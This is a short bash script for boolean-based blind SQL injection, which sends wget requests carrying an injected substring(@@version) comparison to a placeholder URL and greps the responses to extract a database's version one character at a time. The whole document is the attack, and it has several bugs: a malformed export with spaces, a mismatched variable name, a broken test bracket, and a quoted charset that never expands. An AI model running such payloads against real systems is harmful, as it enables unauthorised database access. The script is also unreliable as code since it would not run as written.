#!/bin/bash

charset='echo {0..9} {A..z} \. \: \, \; \_ \@'

export URL = "vulnerable_URL"
export true_string="string_that_validate_a_true_result"

for i in $charset
do
wget "$URL?id=string ' and substring(@@version, 1, 1) = '$i" -q -O - | grep "$truestring" &> /dev/null
if ["$?" == "0"]
then
echo Character found: $i
break
fi
done
